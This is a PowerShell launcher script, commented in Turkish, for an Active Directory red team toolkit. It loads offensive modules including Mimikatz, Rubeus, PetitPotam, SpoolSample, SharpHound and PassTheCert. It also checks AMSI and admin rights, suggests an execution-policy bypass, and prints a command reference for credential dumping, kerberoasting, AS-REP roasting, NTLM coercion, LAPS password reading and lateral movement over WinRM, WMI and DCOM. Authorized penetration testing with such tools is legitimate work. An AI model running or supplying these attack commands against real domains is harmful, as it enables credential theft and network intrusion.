<#
.SYNOPSIS
    AD Red Team PowerShell Toolkit - Ana launcher ve modül yöneticisi.

.DESCRIPTION
    Tüm AD red team araçlarını tek bir modülden yükler ve yönetir.
    Import-Module ile yüklendiğinde tüm fonksiyonlar kullanılabilir hale gelir.

    Yüklenen Fonksiyonlar:
    ─────────────────────────────────────────────
    Keşif & Enumeration:
      Invoke-ADExplorer         ADExplorer yerine PS native AD keşif
      PowerView                 PowerView.ps1 (dot-source)
      Powermad                  Powermad.ps1 (dot-source)

    Credential Harvesting:
      Invoke-Mimikatz           Mimikatz in-memory çalıştırma
      Invoke-InternalMonologue  NetNTLM hash toplama (ağ trafiği yok)

    Kerberos Saldırıları:
      Invoke-Rubeus             Rubeus in-memory (.NET reflection)

    NTLM Coercion:
      Invoke-PetitPotam         MS-EFSRPC NTLM coercion (PS native)
      Invoke-SpoolSample        PrinterBug in-memory (.NET reflection)

    Lateral Movement:
      Invoke-LateralMovement    WinRM/WMI/DCOM/Task ile uzak komut çalıştırma

    BloodHound:
      Invoke-SharpHound         SharpHound in-memory (.NET reflection)

    Certificate Abuse:
      Invoke-PassTheCert        PassTheCert in-memory (.NET reflection)

    GPO:
      fix-gpo                   GPO link script (dot-source)

.EXAMPLE
    # Modülü yükle
    Import-Module .\AD-RedTeam-Toolkit.ps1

.EXAMPLE
    # Veya dot-source ile
    . .\AD-RedTeam-Toolkit.ps1

.EXAMPLE
    # Yüklendikten sonra herhangi bir fonksiyonu kullan
    Invoke-ADExplorer -Mode SPN
    Invoke-Rubeus -Command "kerberoast"
    Invoke-LateralMovement -Target SERVER01 -Command "whoami"

.NOTES
    AD Red Team PowerShell Toolkit
    Tüm araçlar yalnızca yetkili sızma testleri için kullanılmalıdır.
#>

# ═══════════════════════════════════════════════════════════════
#  AD RED TEAM POWERSHELL TOOLKIT - LAUNCHER
# ═══════════════════════════════════════════════════════════════

$ErrorActionPreference = "SilentlyContinue"
$ToolkitRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

# ─── Banner ──────────────────────────────────────────────────
function Show-ToolkitBanner {
    $banner = @"

    ╔══════════════════════════════════════════════════════════════╗
    ║          AD RED TEAM POWERSHELL TOOLKIT                     ║
    ║                                                              ║
    ║   Tum araclar PowerShell uzerinden calisir.                 ║
    ║   EXE veya Python bagimliligi yoktur.                       ║
    ╚══════════════════════════════════════════════════════════════╝

"@
    Write-Host $banner -ForegroundColor Red
}

# ─── Ortam Kontrolleri ───────────────────────────────────────
function Test-ToolkitEnvironment {
    Write-Host "[*] Ortam kontrol ediliyor..." -ForegroundColor Cyan
    Write-Host ""

    # PowerShell versiyonu
    $psVersion = $PSVersionTable.PSVersion
    Write-Host "  PowerShell Version  : $psVersion" -ForegroundColor White
    if ($psVersion.Major -lt 3) {
        Write-Warning "  [!] PS 3.0+ önerilir. Bazı özellikler çalışmayabilir."
    }

    # Execution Policy
    $execPolicy = Get-ExecutionPolicy
    Write-Host "  Execution Policy    : $execPolicy" -ForegroundColor $(if ($execPolicy -eq "Restricted") { "Red" } else { "White" })
    if ($execPolicy -eq "Restricted") {
        Write-Host "  [!] Bypass: Set-ExecutionPolicy Bypass -Scope Process" -ForegroundColor Yellow
    }

    # Language Mode
    $langMode = $ExecutionContext.SessionState.LanguageMode
    Write-Host "  Language Mode       : $langMode" -ForegroundColor $(if ($langMode -ne "FullLanguage") { "Red" } else { "White" })
    if ($langMode -ne "FullLanguage") {
        Write-Warning "  [!] Constrained Language Mode aktif! Reflection çalışmayabilir."
    }

    # AMSI
    try {
        $amsiInitFailed = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($amsiInitFailed) {
            Write-Host "  AMSI                : Aktif" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "  AMSI                : Kontrol edilemedi" -ForegroundColor DarkGray
    }

    # .NET versiyonu
    $dotnetVersion = [System.Runtime.InteropServices.RuntimeEnvironment]::GetSystemVersion()
    Write-Host "  .NET Runtime        : $dotnetVersion" -ForegroundColor White

    # Admin hakları
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    Write-Host "  Admin Hakları       : $(if ($isAdmin) { 'Evet' } else { 'Hayır' })" -ForegroundColor $(if ($isAdmin) { "Green" } else { "Yellow" })

    # Domain bilgisi
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        Write-Host "  Domain              : $($domain.Name)" -ForegroundColor Green
        Write-Host "  Domain Controller   : $($domain.PdcRoleOwner.Name)" -ForegroundColor White
        Write-Host "  Forest              : $($domain.Forest.Name)" -ForegroundColor White
    }
    catch {
        Write-Host "  Domain              : Bağlı değil veya erişilemiyor" -ForegroundColor Red
    }

    # Mevcut kullanıcı
    Write-Host "  Kullanıcı           : $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor White

    Write-Host ""
}

# ─── Modülleri Yükle ─────────────────────────────────────────
function Import-ToolkitModules {
    Write-Host "[*] Modüller yükleniyor..." -ForegroundColor Cyan

    $modules = @(
        @{ Name = "Invoke-Rubeus";            File = "Invoke-Rubeus.ps1";            Type = ".NET Reflection" }
        @{ Name = "Invoke-SharpHound";        File = "Invoke-SharpHound.ps1";        Type = ".NET Reflection" }
        @{ Name = "Invoke-InternalMonologue"; File = "Invoke-InternalMonologue.ps1"; Type = ".NET Reflection" }
        @{ Name = "Invoke-PassTheCert";       File = "Invoke-PassTheCert.ps1";       Type = ".NET Reflection" }
        @{ Name = "Invoke-SpoolSample";       File = "Invoke-SpoolSample.ps1";       Type = ".NET Reflection" }
        @{ Name = "Invoke-PetitPotam";        File = "Invoke-PetitPotam.ps1";        Type = "PS Native (Port)" }
        @{ Name = "Invoke-Mimikatz";          File = "Invoke-Mimikatz.ps1";          Type = "PE Loader" }
        @{ Name = "Invoke-LateralMovement";   File = "Invoke-LateralMovement.ps1";   Type = "PS Native" }
        @{ Name = "Invoke-ADExplorer";        File = "Invoke-ADExplorer.ps1";        Type = "PS Native" }
        @{ Name = "PowerView";                File = "PowerView.ps1";                Type = "PS Script" }
        @{ Name = "Powermad";                 File = "Powermad.ps1";                 Type = "PS Script" }
    )

    $loaded = 0
    $failed = 0

    foreach ($module in $modules) {
        $filePath = Join-Path $ToolkitRoot $module.File
        if (Test-Path $filePath) {
            try {
                . $filePath
                Write-Host "  [+] $($module.Name.PadRight(28)) $($module.Type)" -ForegroundColor Green
                $loaded++
            }
            catch {
                Write-Host "  [-] $($module.Name.PadRight(28)) HATA: $($_.Exception.Message)" -ForegroundColor Red
                $failed++
            }
        }
        else {
            Write-Host "  [-] $($module.Name.PadRight(28)) Dosya bulunamadı" -ForegroundColor DarkGray
            $failed++
        }
    }

    Write-Host ""
    Write-Host "[+] $loaded modül yüklendi, $failed başarısız." -ForegroundColor $(if ($failed -eq 0) { "Green" } else { "Yellow" })
}

# ─── Yardım Menüsü ──────────────────────────────────────────
function Show-ToolkitHelp {
    $help = @"

 ╔═══════════════════════════════════════════════════════════════════════╗
 ║                    TOOLKIT KOMUT REFERANSI                          ║
 ╠═══════════════════════════════════════════════════════════════════════╣
 ║                                                                     ║
 ║  KESIF & ENUMERATION                                                ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Invoke-ADExplorer -Mode Users        Tum kullanicilari listele     ║
 ║  Invoke-ADExplorer -Mode Admins       Admin hesaplarini goster      ║
 ║  Invoke-ADExplorer -Mode SPN          Kerberoast hedefleri          ║
 ║  Invoke-ADExplorer -Mode ASREPRoast   AS-REP Roast hedefleri        ║
 ║  Invoke-ADExplorer -Mode DCs          Domain Controller'lar         ║
 ║  Invoke-ADExplorer -Mode Trusts       Trust iliskileri              ║
 ║  Invoke-ADExplorer -Mode Unconstrained  Delegation nesneleri        ║
 ║  Invoke-ADExplorer -Mode LAPS         LAPS parolalari               ║
 ║  Invoke-ADExplorer -Mode GPO          GPO nesneleri                 ║
 ║  Invoke-ADExplorer -Mode Snapshot     Tum verileri JSON'a kaydet    ║
 ║                                                                     ║
 ║  CREDENTIAL HARVESTING                                              ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Invoke-Mimikatz -DumpCreds           Bellekteki parolalar          ║
 ║  Invoke-Mimikatz -Command "..."       Ozel mimikatz komutu          ║
 ║  Invoke-InternalMonologue             NetNTLM hash toplama          ║
 ║                                                                     ║
 ║  KERBEROS SALDIRILARI                                               ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Invoke-Rubeus -Command "kerberoast"         Kerberoasting          ║
 ║  Invoke-Rubeus -Command "asreproast"         AS-REP Roasting        ║
 ║  Invoke-Rubeus -Command "hash /password:X"   Hash hesaplama         ║
 ║  Invoke-Rubeus -Command "s4u /user:X ..."    S4U saldirisi          ║
 ║                                                                     ║
 ║  NTLM COERCION                                                     ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Invoke-PetitPotam -Target DC -Listener IP   EFS coercion           ║
 ║  Invoke-SpoolSample -Command "DC LISTENER"   PrinterBug             ║
 ║                                                                     ║
 ║  LATERAL MOVEMENT                                                   ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Invoke-LateralMovement -Target X -Command Y   WinRM (varsayilan)   ║
 ║  Invoke-LateralMovement ... -Method WMI         WMI ile             ║
 ║  Invoke-LateralMovement ... -Method DCOM        DCOM ile            ║
 ║  Invoke-LateralMovement ... -Method Task        Sched. Task ile     ║
 ║  Invoke-LateralMovement -Target X -Interactive  PS Session ac       ║
 ║  Test-LateralMovementMethods -Target X          Yontemleri test et  ║
 ║                                                                     ║
 ║  BLOODHOUND                                                        ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Invoke-SharpHound -Command "--CollectionMethods All"               ║
 ║  Invoke-SharpHound -Command "--CollectionMethods DCOnly"            ║
 ║                                                                     ║
 ║  CERTIFICATE ABUSE                                                  ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Invoke-PassTheCert -Command "/server:DC /cert-path:X /add-comp"    ║
 ║                                                                     ║
 ║  YARDIM                                                             ║
 ║  ─────────────────────────────────────────────────                   ║
 ║  Show-ToolkitHelp                     Bu yardim menusunu goster     ║
 ║  Test-ToolkitEnvironment              Ortam bilgilerini goster      ║
 ║  Get-Help Invoke-XXX -Examples        Araç icin ornekler            ║
 ║                                                                     ║
 ╚═══════════════════════════════════════════════════════════════════════╝

"@
    Write-Host $help -ForegroundColor Cyan
}

# ─── Başlat ──────────────────────────────────────────────────
Show-ToolkitBanner
Test-ToolkitEnvironment
Import-ToolkitModules

Write-Host ""
Write-Host "[*] Yardım için: Show-ToolkitHelp" -ForegroundColor Yellow
Write-Host "[*] Ortam bilgileri: Test-ToolkitEnvironment" -ForegroundColor Yellow
Write-Host ""
